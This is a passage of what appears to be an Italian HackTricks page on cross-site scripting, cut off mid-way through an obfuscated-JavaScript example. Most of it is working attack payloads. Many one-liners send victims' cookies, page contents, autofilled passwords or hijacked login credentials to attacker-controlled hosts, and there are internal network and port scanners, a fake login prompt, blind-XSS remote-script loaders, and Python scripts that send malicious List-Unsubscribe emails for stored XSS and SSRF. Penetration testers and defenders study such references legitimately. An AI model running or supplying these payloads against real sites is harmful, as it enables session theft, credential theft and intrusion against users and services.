(ﾟｰﾟ + ﾟΘﾟ) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟｰﾟ +
(c ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟΘﾟ +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
ﾟΘﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
ﾟΘﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) - ﾟΘﾟ) +
(o ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
(o ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟΘﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
(c ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟｰﾟ +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟΘﾟ +
ﾟДﾟ[ﾟoﾟ]
)(ﾟΘﾟ)
)("_")
```

```javascript
// It's also possible to execute JS code only with the chars: []`+!${}
```
## XSS payloads comuni

### Diversi payloads in 1


{{#ref}}
steal-info-js.md
{{#endref}}

### Iframe Trap

Fai in modo che l'utente navighi nella pagina senza uscire dall'iframe e intercetti le sue azioni (incluse le informazioni inviate nei form):


{{#ref}}
../iframe-traps.md
{{#endref}}

### Recuperare Cookies
```javascript
<img src=x onerror=this.src="http://<YOUR_SERVER_IP>/?c="+document.cookie>
<img src=x onerror="location.href='http://<YOUR_SERVER_IP>/?c='+ document.cookie">
<script>new Image().src="http://<IP>/?c="+encodeURI(document.cookie);</script>
<script>new Audio().src="http://<IP>/?c="+escape(document.cookie);</script>
<script>location.href = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>location = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.location = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.location.href = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.write('<img src="http://<YOUR_SERVER_IP>?c='+document.cookie+'" />')</script>
<script>window.location.assign('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>window['location']['assign']('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>window['location']['href']('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>document.location=["http://<YOUR_SERVER_IP>?c",document.cookie].join()</script>
<script>var i=new Image();i.src="http://<YOUR_SERVER_IP>/?c="+document.cookie</script>
<script>window.location="https://<SERVER_IP>/?c=".concat(document.cookie)</script>
<script>var xhttp=new XMLHttpRequest();xhttp.open("GET", "http://<SERVER_IP>/?c="%2Bdocument.cookie, true);xhttp.send();</script>
<script>eval(atob('ZG9jdW1lbnQud3JpdGUoIjxpbWcgc3JjPSdodHRwczovLzxTRVJWRVJfSVA+P2M9IisgZG9jdW1lbnQuY29va2llICsiJyAvPiIp'));</script>
<script>fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net', {method: 'POST', mode: 'no-cors', body:document.cookie});</script>
<script>navigator.sendBeacon('https://ssrftest.com/x/AAAAA',document.cookie)</script>
```
> [!TIP]
> **Non potrai accedere ai cookie da JavaScript** se il flag HTTPOnly è impostato sul cookie. Ma qui trovi [alcuni modi per bypassare questa protezione](../hacking-with-cookies/index.html#httponly) se sei abbastanza fortunato.

### Rubare il contenuto della pagina
```javascript
var url = "http://10.10.10.25:8000/vac/a1fbf2d1-7c3f-48d2-b0c3-a205e54e09e8"
var attacker = "http://10.10.14.8/exfil"
var xhr = new XMLHttpRequest()
xhr.onreadystatechange = function () {
if (xhr.readyState == XMLHttpRequest.DONE) {
fetch(attacker + "?" + encodeURI(btoa(xhr.responseText)))
}
}
xhr.open("GET", url, true)
xhr.send(null)
```
### Trova IP interni
```html
<script>
var q = []
var collaboratorURL =
"http://5ntrut4mpce548i2yppn9jk1fsli97.burpcollaborator.net"
var wait = 2000
var n_threads = 51

// Prepare the fetchUrl functions to access all the possible
for (i = 1; i <= 255; i++) {
q.push(
(function (url) {
return function () {
fetchUrl(url, wait)
}
})("http://192.168.0." + i + ":8080")
)
}

// Launch n_threads threads that are going to be calling fetchUrl until there is no more functions in q
for (i = 1; i <= n_threads; i++) {
if (q.length) q.shift()()
}

function fetchUrl(url, wait) {
console.log(url)
var controller = new AbortController(),
signal = controller.signal
fetch(url, { signal })
.then((r) =>
r.text().then((text) => {
location =
collaboratorURL +
"?ip=" +
url.replace(/^http:\/\//, "") +
"&code=" +
encodeURIComponent(text) +
"&" +
Date.now()
})
)
.catch((e) => {
if (!String(e).includes("The user aborted a request") && q.length) {
q.shift()()
}
})

setTimeout((x) => {
controller.abort()
if (q.length) {
q.shift()()
}
}, wait)
}
</script>
```
### Port Scanner (fetch)
```javascript
const checkPort = (port) => { fetch(http://localhost:${port}, { mode: "no-cors" }).then(() => { let img = document.createElement("img"); img.src = http://attacker.com/ping?port=${port}; }); } for(let i=0; i<1000; i++) { checkPort(i); }
```
### Port Scanner (websockets)
```python
var ports = [80, 443, 445, 554, 3306, 3690, 1234];
for(var i=0; i<ports.length; i++) {
var s = new WebSocket("wss://192.168.1.1:" + ports[i]);
s.start = performance.now();
s.port = ports[i];
s.onerror = function() {
console.log("Port " + this.port + ": " + (performance.now() -this.start) + " ms");
};
s.onopen = function() {
console.log("Port " + this.port+ ": " + (performance.now() -this.start) + " ms");
};
}
```
_Tempi brevi indicano una porta che risponde_ _Tempi più lunghi indicano nessuna risposta._

Consulta l'elenco delle porte bloccate in Chrome [**here**](https://src.chromium.org/viewvc/chrome/trunk/src/net/base/net_util.cc) e in Firefox [**here**](https://www-archive.mozilla.org/projects/netlib/portbanning#portlist).

### Riquadro per chiedere le credenziali
```html
<style>::placeholder { color:white; }</style><script>document.write("<div style='position:absolute;top:100px;left:250px;width:400px;background-color:white;height:230px;padding:15px;border-radius:10px;color:black'><form action='https://example.com/'><p>Your sesion has timed out, please login again:</p><input style='width:100%;' type='text' placeholder='Username' /><input style='width: 100%' type='password' placeholder='Password'/><input type='submit' value='Login'></form><p><i>This login box is presented using XSS as a proof-of-concept</i></p></div>")</script>
```
### Cattura delle password dalla compilazione automatica
```javascript
<b>Username:</><br>
<input name=username id=username>
<b>Password:</><br>
<input type=password name=password onchange="if(this.value.length)fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```
Quando vengono inseriti dati nel campo password, lo username e la password vengono inviati al attackers server; anche se il client seleziona una password salvata e non digita nulla, le credenziali verranno ex-filtrated.

### Hijack form handlers to exfiltrate credentials (const shadowing)

Se un handler critico (es., `function DoLogin(){...}`) è dichiarato più avanti nella pagina, e il tuo payload viene eseguito prima (es., tramite un inline JS-in-JS sink), definisci un `const` con lo stesso nome per anticipare e bloccare l'handler. Le successive dichiarazioni di funzione non possono riassegnare un nome `const`, lasciando il tuo hook in controllo:
```javascript
const DoLogin = () => {
const pwd  = Trim(FormInput.InputPassword.value);
const user = Trim(FormInput.InputUtente.value);
fetch('https://attacker.example/?u='+encodeURIComponent(user)+'&p='+encodeURIComponent(pwd));
};
```
Note
- Questo si basa sull'ordine di esecuzione: la tua injection deve essere eseguita prima della dichiarazione legittima.
- Se il tuo payload è racchiuso in `eval(...)`, i binding `const/let` non diventeranno globali. Usa la tecnica di injection dinamica `<script>` dalla sezione “Deliverable payloads with eval(atob()) and scope nuances” per assicurare un binding veramente globale e non riassegnabile.
- Quando i filtri per parole chiave bloccano il codice, combina identificatori Unicode-escaped o la consegna tramite `eval(atob('...'))`, come mostrato sopra.

### Keylogger

Cercando su github ho trovato alcuni esempi diversi:

- [https://github.com/JohnHoder/Javascript-Keylogger](https://github.com/JohnHoder/Javascript-Keylogger)
- [https://github.com/rajeshmajumdar/keylogger](https://github.com/rajeshmajumdar/keylogger)
- [https://github.com/hakanonymos/JavascriptKeylogger](https://github.com/hakanonymos/JavascriptKeylogger)
- Puoi anche usare metasploit `http_javascript_keylogger`

### Stealing CSRF tokens
```javascript
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/email',true);
req.send();
function handleResponse() {
var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
var changeReq = new XMLHttpRequest();
changeReq.open('post', '/email/change-email', true);
changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```
### Rubare messaggi PostMessage
```html
<img src="https://attacker.com/?" id=message>
<script>
window.onmessage = function(e){
document.getElementById("message").src += "&"+e.data;
</script>
```
### PostMessage-origin script loaders (opener-gated)

Se una pagina **memorizza `event.origin` da un `postMessage` e successivamente lo concatena in un URL di script**, il mittente controlla l'**origine** del JS caricato:
```javascript
window.addEventListener('message', (event) => {
if (event.data.msg_type === 'IWL_BOOTSTRAP') {
localStorage.setItem('CFG', {host: event.origin, pixelID: event.data.pixel_id});
startIWL(); // later loads `${host}/sdk/${pixelID}/iwl.js`
}
});
```
Exploitation recipe (from CAPIG):

- **Gates**: si attiva solo quando `window.opener` esiste e `pixel_id` è allowlisted; **l'origine non viene mai verificata**.
- **Use CSP-allowed origin**: pivotare verso un dominio già permesso dalla CSP della vittima (es., pagine help per utenti non loggati che permettono analytics come `*.THIRD-PARTY.com`) e ospitare `/sdk/<pixel_id>/iwl.js` lì tramite takeover/XSS/upload.
- **Restore `opener`**: in Android WebView, `window.name='x'; window.open(target,'x')` fa sì che la pagina diventi il suo stesso opener; inviare il `postMessage` maligno da un iframe dirottato.
- **Trigger**: l'iframe invia `{msg_type:'IWL_BOOTSTRAP', pixel_id:<allowed>}`; il parent poi carica `iwl.js` dell'attaccante dall'origine consentita dalla CSP e lo esegue.

Questo trasforma la validazione origin-less di `postMessage` in un **remote script loader primitive** che sopravvive alla CSP se riesci ad atterrare su qualsiasi origin già consentito dalla policy.

### Supply-chain stored XSS via backend JS concatenation

Quando un backend costruisce un SDK condiviso concatenando stringhe JS con valori controllati dall'utente, qualsiasi rottura di virgolette/struttura può iniettare script che viene servito a ogni consumer:

- Esempio di pattern (Meta CAPIG): il server appende `cbq.config.set("<pixel>","IWLParameters",{params: <user JSON>});` direttamente dentro `capig-events.js`.
- L'inserimento di `'` o `"]}` chiude il literal/oggetto e aggiunge JS dell'attaccante, creando **stored XSS** nello SDK distribuito per ogni sito che lo carica (first-party e third-party).

### Stored XSS in generated reports when escaping is disabled

Se i file caricati vengono parsati e i loro metadati vengono inseriti in report HTML con escaping disabilitato (`|safe`, renderer personalizzati), quei metadati sono una **stored XSS sink**. Flusso di esempio:
```python
xmlhost = data.getAttribute(f'{ns}:host')
ret_list.append(('dialer_code_found', (xmlhost,), ()))
'title': a_template['title'] % t_name  # %s fed by xmlhost
```
Un template Django renderizza `{{item|key:"title"|safe}}`, quindi l'HTML dell'attaccante viene eseguito.

**Exploit:** inserire **HTML codificato con entità** in qualsiasi campo manifest/config che raggiunge il report:
```xml
<data android:scheme="android_secret_code"
android:host="&lt;img src=x onerror=alert(document.domain)&gt;"/>
```
Reso con `|safe`, il report genera `<img ...>` e attiva JS alla visualizzazione.

**Hunting:** cerca report/notification builders che riutilizzano campi parsati in `%s`/f-strings e disabilitano auto-escape. Un tag codificato in un uploaded manifest/log/archive persiste come XSS per ogni visualizzatore.

### Abusing Service Workers


{{#ref}}
abusing-service-workers.md
{{#endref}}

### Accessing Shadow DOM


{{#ref}}
shadow-dom.md
{{#endref}}

### Polyglots


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xss_polyglots.txt
{{#endref}}

### Blind XSS payloads

Puoi anche usare: [https://xsshunter.com/](https://xsshunter.com)
```html
"><img src='//domain/xss'>
"><script src="//domain/xss.js"></script>
><a href="javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">Click Me For An Awesome Time</a>
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//0mnb1tlfl5x4u55yfb57dmwsajgd42.burpcollaborator.net/scriptb");a.send();</script>

<!-- html5sec - Self-executing focus event via autofocus: -->
"><input onfocus="eval('d=document; _ = d.createElement(\'script\');_.src=\'\/\/domain/m\';d.body.appendChild(_)')" autofocus>

<!-- html5sec - JavaScript execution via iframe and onload -->
"><iframe onload="eval('d=document; _=d.createElement(\'script\');_.src=\'\/\/domain/m\';d.body.appendChild(_)')">

<!-- html5sec - SVG tags allow code to be executed with onload without any other elements. -->
"><svg onload="javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')" xmlns="http://www.w3.org/2000/svg"></svg>

<!-- html5sec -  allow error handlers in <SOURCE> tags if encapsulated by a <VIDEO> tag. The same works for <AUDIO> tags  -->
"><video><source onerror="eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">

<!--  html5sec - eventhandler -  element fires an "onpageshow" event without user interaction on all modern browsers. This can be abused to bypass blacklists as the event is not very well known.  -->
"><body onpageshow="eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">

<!-- xsshunter.com - Sites that use JQuery -->
<script>$.getScript("//domain")</script>

<!-- xsshunter.com - When <script> is filtered -->
"><img src=x id=payload&#61;&#61; onerror=eval(atob(this.id))>

<!-- xsshunter.com - Bypassing poorly designed systems with autofocus -->
"><input onfocus=eval(atob(this.id)) id=payload&#61;&#61; autofocus>

<!-- noscript trick -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

<!-- whitelisted CDNs in CSP -->
"><script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.1/angular.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.1/angular.min.js"></script>
<!-- ... add more CDNs, you'll get WARNING: Tried to load angular more than once if multiple load. but that does not matter you'll get a HTTP interaction/exfiltration :-]... -->
<div ng-app ng-csp><textarea autofocus ng-focus="d=$event.view.document;d.location.hash.match('x1') ? '' : d.location='//localhost/mH/'"></textarea></div>

<!-- Payloads from https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-blind-cross-site-scripting-xss-vulnerabilities-a-complete-guide -->
<!-- Image tag -->
'"><img src="x" onerror="eval(atob(this.id))" id="Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0ne1NFUlZFUn0vc2NyaXB0LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHgpOw==">

<!-- Input tag with autofocus -->
'"><input autofocus onfocus="eval(atob(this.id))" id="Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0ne1NFUlZFUn0vc2NyaXB0LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHgpOw==">

<!-- In case jQuery is loaded, we can make use of the getScript method -->
'"><script>$.getScript("{SERVER}/script.js")</script>

<!-- Make use of the JavaScript protocol (applicable in cases where your input lands into the "href" attribute or a specific DOM sink) -->
javascript:eval(atob("Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0ne1NFUlZFUn0vc2NyaXB0LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHgpOw=="))

<!-- Render an iframe to validate your injection point and receive a callback -->
'"><iframe src="{SERVER}"></iframe>

<!-- Bypass certain Content Security Policy (CSP) restrictions with a base tag -->
<base href="{SERVER}" />

<!-- Make use of the meta-tag to initiate a redirect -->
<meta http-equiv="refresh" content="0; url={SERVER}" />

<!-- In case your target makes use of AngularJS -->
{{constructor.constructor("import('{SERVER}/script.js')")()}}
```
### Regex - Accedere a contenuti nascosti

Da [**this writeup**](https://blog.arkark.dev/2022/11/18/seccon-en/#web-piyosay) si può apprendere che, anche se alcuni valori scompaiono da JS, è comunque possibile trovarli negli attributi JS di diversi oggetti. Per esempio, un input di un REGEX è ancora possibile trovarlo dopo che il valore dell'input del regex è stato rimosso:
```javascript
// Do regex with flag
flag = "CTF{FLAG}"
re = /./g
re.test(flag)

// Remove flag value, nobody will be able to get it, right?
flag = ""

// Access previous regex input
console.log(RegExp.input)
console.log(RegExp.rightContext)
console.log(
document.all["0"]["ownerDocument"]["defaultView"]["RegExp"]["rightContext"]
)
```
### Brute-Force List


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xss.txt
{{#endref}}

## XSS: abuso di altre vulnerabilità

### XSS in Markdown

Si può iniettare codice Markdown che verrà renderizzato? Forse puoi ottenere XSS! Controlla:


{{#ref}}
xss-in-markdown.md
{{#endref}}

### XSS to SSRF

Hai XSS su un **sito che usa caching**? Prova a **trasformarlo in SSRF** tramite Edge Side Include Injection con questo payload:
```python
<esi:include src="http://yoursite.com/capture" />
```
Usalo per bypassare le restrizioni sui cookie, i filtri XSS e molto altro!\
Maggiori informazioni su questa tecnica qui: [**XSLT**](../xslt-server-side-injection-extensible-stylesheet-language-transformations.md).

### XSS in dynamic created PDF

Se una pagina web crea un PDF usando input controllato dall'utente, puoi provare a **ingannare il bot** che genera il PDF per farlo **eseguire codice JS arbitrario**.\
Quindi, se il **PDF creator bot trova** qualche tipo di **tag HTML**, li **interpreta**, e puoi **abusare** di questo comportamento per causare una **Server XSS**.


{{#ref}}
server-side-xss-dynamic-pdf.md
{{#endref}}

Se non puoi iniettare tag HTML, può valere la pena provare a **iniettare dati PDF**:


{{#ref}}
pdf-injection.md
{{#endref}}

### XSS in Amp4Email

AMP, progettato per accelerare le prestazioni delle pagine web sui dispositivi mobili, incorpora tag HTML supportati da JavaScript per assicurare funzionalità con enfasi sulla velocità e la sicurezza. Supporta una serie di componenti per varie funzionalità, accessibili tramite [AMP components](https://amp.dev/documentation/components/?format=websites).

Il formato [**AMP for Email**](https://amp.dev/documentation/guides-and-tutorials/learn/email-spec/amp-email-format/) estende componenti AMP specifici alle email, permettendo ai destinatari di interagire con i contenuti direttamente nelle loro email.

Esempio [**writeup XSS in Amp4Email in Gmail**](https://adico.me/post/xss-in-gmail-s-amp4email).

### List-Unsubscribe Header Abuse (Webmail XSS & SSRF)

L'header RFC 2369 `List-Unsubscribe` incorpora URI controllati dall'attaccante che molti client webmail e client di posta convertono automaticamente in pulsanti "Unsubscribe". Quando quegli URI vengono renderizzati o recuperati senza validazione, l'header diventa un punto di injection sia per stored XSS (se il link di unsubscribe è inserito nel DOM) sia per SSRF (se il server esegue la richiesta di unsubscribe per conto dell'utente).

#### Stored XSS via `javascript:` URIs

1. **Inviati un'email** a te stesso in cui l'header punta a un URI `javascript:` mantenendo il resto del messaggio innocuo in modo che i filtri antispam non lo scartino.
2. **Verifica che l'interfaccia renda il valore** (molti client lo mostrano in un pannello "List Info") e controlla se il tag `<a>` risultante eredita attributi controllati dall'attaccante come `href` o `target`.
3. **Avvia l'esecuzione** (es. CTRL+click, middle-click, o "open in new tab") quando il link usa `target="_blank"`; i browser valuteranno il JavaScript fornito nell'origine dell'applicazione webmail.
4. Osserva la primitiva stored-XSS: il payload persiste con l'email e richiede solo un click per essere eseguito.
```text
List-Unsubscribe: <javascript://attacker.tld/%0aconfirm(document.domain)>
List-Unsubscribe-Post: List-Unsubscribe=One-Click
```
Il newline byte (`%0a`) nell'URI mostra che anche caratteri insoliti sopravvivono alla pipeline di rendering in client vulnerabili come Horde IMP H5, che mostrerà la stringa letteralmente all'interno dell'anchor tag.

<details>
<summary>Minimal SMTP PoC che consegna un header List-Unsubscribe malevolo</summary>
```python
#!/usr/bin/env python3
import smtplib
from email.message import EmailMessage

smtp_server = "mail.example.org"
smtp_port = 587
smtp_user = "user@example.org"
smtp_password = "REDACTED"
sender = "list@example.org"
recipient = "victim@example.org"

msg = EmailMessage()
msg.set_content("Testing List-Unsubscribe rendering")
msg["From"] = sender
msg["To"] = recipient
msg["Subject"] = "Newsletter"
msg["List-Unsubscribe"] = "<javascript://evil.tld/%0aconfirm(document.domain)>"
msg["List-Unsubscribe-Post"] = "List-Unsubscribe=One-Click"

with smtplib.SMTP(smtp_server, smtp_port) as smtp:
smtp.starttls()
smtp.login(smtp_user, smtp_password)
smtp.send_message(msg)
```
</details>

#### Proxy di unsubscribe lato server -> SSRF

Alcuni client, come l'app Nextcloud Mail, fanno da proxy per l'azione di unsubscribe lato server: cliccare il pulsante istruisce il server a recuperare l'URL fornito. Questo trasforma l'intestazione in un primitivo SSRF, specialmente quando gli amministratori impostano 'allow_local_remote_servers' => true (documentato in [HackerOne report 2902856](https://hackerone.com/reports/2902856)), il che permette richieste verso loopback e gli intervalli RFC1918.

1. **Crea un'email** dove `List-Unsubscribe` punti a un endpoint controllato dall'attaccante (per SSRF cieco usa Burp Collaborator / OAST).
2. **Mantieni `List-Unsubscribe-Post: List-Unsubscribe=One-Click`** così l'UI mostra un pulsante di unsubscribe con un solo clic.
3. **Soddisfa i requisiti di trust**: Nextcloud, per esempio, effettua richieste HTTPS di unsubscribe solo quando il messaggio supera DKIM, quindi l'attaccante deve firmare l'email usando un dominio che controlla.
4. **Consegna il messaggio a una casella gestita dal server target** e attendi che un utente clicchi il pulsante di unsubscribe.
5. **Osserva il callback lato server** sull'endpoint Collaborator, poi pivot verso indirizzi interni una volta confermato il primitivo.
```text
List-Unsubscribe: <http://abcdef.oastify.com>
List-Unsubscribe-Post: List-Unsubscribe=One-Click
```
<details>
<summary>Messaggio List-Unsubscribe firmato DKIM per test SSRF</summary>
```python
#!/usr/bin/env python3
import smtplib
from email.message import EmailMessage
import dkim

smtp_server = "mail.example.org"
smtp_port = 587
smtp_user = "user@example.org"
smtp_password = "REDACTED"
dkim_selector = "default"
dkim_domain = "example.org"
dkim_private_key = """-----BEGIN PRIVATE KEY-----\n...\n-----END PRIVATE KEY-----"""

msg = EmailMessage()
msg.set_content("One-click unsubscribe test")
msg["From"] = "list@example.org"
msg["To"] = "victim@example.org"
msg["Subject"] = "Mailing list"
msg["List-Unsubscribe"] = "<http://abcdef.oastify.com>"
msg["List-Unsubscribe-Post"] = "List-Unsubscribe=One-Click"

raw = msg.as_bytes()
signature = dkim.sign(
message=raw,
selector=dkim_selector.encode(),
domain=dkim_domain.encode(),
privkey=dkim_private_key.encode(),
include_headers=["From", "To", "Subject"]
)
msg["DKIM-Signature"] = signature.decode().split(": ", 1)[1].replace("\r", "").replace("\n", "")

with smtplib.SMTP(smtp_server, smtp_port) as smtp:
smtp.starttls()
smtp.login(smtp_user, smtp_password)
smtp.send_message(msg)
```
</details>

**Note di test**

- Usa un endpoint OAST per raccogliere blind SSRF hits, poi adatta l'URL `List-Unsubscribe` per puntare a `http://127.0.0.1:PORT`, ai servizi di metadati, o ad altri host interni una volta confermato il primitive.
- Poiché l'unsubscribe helper spesso riutilizza lo stesso HTTP stack dell'applicazione, erediti le sue impostazioni di proxy, i HTTP verbs e le riscritture degli header, permettendo ulteriori trucchi di traversal descritti nella [SSRF methodology](../ssrf-server-side-request-forgery/README.md).

### XSS caricamento file (svg)

Carica come immagine un file come il seguente (da [http://ghostlulz.com/xss-svg/](http://ghostlulz.com/xss-svg/)):
```html
Content-Type: multipart/form-data; boundary=---------------------------232181429808
Content-Length: 574
-----------------------------232181429808
Content-Disposition: form-data; name="img"; filename="img.svg"
Content-Type: image/svg+xml

<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
<script type="text/javascript">
alert(1);
</script>
</svg>
-----------------------------232181429808--
```

```html
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<script type="text/javascript">alert("XSS")</script>
</svg>
```

```html
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
<script type="text/javascript">
alert("XSS");
</script>
</svg>
```

```svg
<svg width="500" height="500"
xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<circle cx="50" cy="50" r="45" fill="green"
id="foo"/>

<foreignObject width="500" height="500">
<iframe xmlns="http://www.w3.org/1999/xhtml" src="data:text/html,&lt;body&gt;&lt;script&gt;document.body.style.background=&quot;red&quot;&lt;/script&gt;hi&lt;/body&gt;" width="400" height="250"/>
<iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:document.write('hi');" width="400" height="250"/>
</foreignObject>
</svg>
```

```html
<svg><use href="//portswigger-labs.net/use_element/upload.php#x" /></svg>
```

```xml
<svg><use href="data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg' &gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x" />
```
Trova **più SVG payloads su** [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)

## Trucchi JS & Informazioni rilevanti


{{#ref}}
other-js-tricks.md
{{#endref}}

## Risorse XSS

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection)
- [http://www.xss-payloads.com](http://www.xss-payloads.com) [https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt](https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt) [https://github.com/materaj/xss-list](https://github.com/materaj/xss-list)
- [https://github.com/ismailtasdelen/xss-payload-list](https://github.com/ismailtasdelen/xss-payload-list)
- [https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec](https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec)
- [https://netsec.expert/2020/02/01/xss-in-2020.html](https://netsec.expert/2020/02/01/xss-in-2020.html)
- [https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-blind-cross-site-scripting-xss-vulnerabilities-a-complete-guide](https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-blind-cross-site-scripting-xss-vulnerabilities-a-complete-guide)

## Riferimenti

- [Trasformare una XSS innocua dietro un WAF in un vettore di phishing realistico](https://blog.hackcommander.com/posts/2025/12/28/turning-a-harmless-xss-behind-a-waf-into-a-realistic-phishing-vector/)
- [XSS e SSRF tramite l'intestazione List-Unsubscribe SMTP in Horde Webmail e Nextcloud Mail](https://security.lauritz-holtmann.de/post/xss-ssrf-list-unsubscribe/)
- [HackerOne Report #2902856 - Nextcloud Mail List-Unsubscribe SSRF](https://hackerone.com/reports/2902856)
- [Da "Low-Impact" RXSS a Credential Stealer: una walkthrough JS-in-JS](https://r3verii.github.io/bugbounty/2025/08/25/rxss-credential-stealer.html)
- [MDN eval()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval)
- [CAPIG XSS: la fiducia nell'origin di postMessage diventa un script loader + la concatenazione di JS nel backend abilita una supply-chain stored XSS](https://ysamm.com/uncategorized/2026/01/13/capig-xss.html)
- [MobSF stored XSS tramite analisi del manifest (unsafe Django safe sink)](https://github.com/advisories/GHSA-8hf7-h89p-3pqj)

{{#include ../../banners/hacktricks-training.md}}
